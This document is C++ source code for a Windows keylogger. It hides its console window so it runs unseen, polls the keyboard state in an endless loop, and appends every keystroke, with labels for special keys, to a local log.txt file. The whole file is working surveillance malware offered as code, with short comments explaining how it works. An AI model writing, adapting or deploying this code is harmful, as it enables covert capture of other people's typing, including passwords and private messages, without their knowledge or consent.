#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StartLogging();

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);//This hides the console and run in the Background
    StartLogging();
    return 0;
}

void StartLogging(){
    char c;
    while (true) {
        for(c=1;c<=254;c++){
            if(GetAsyncKeyState(c) &  0x1 ) {
                ofstream log;//ofstream is used to read or write to files we can specify path of the file too by:- ofstream outfile (path);
                log.open("log.txt", ios::app);
                switch (c)/*This Switch-Case handles unreadable characters*/ {
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]\n";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        log << c;
                }
                log.close();
            }
        }
    }
}
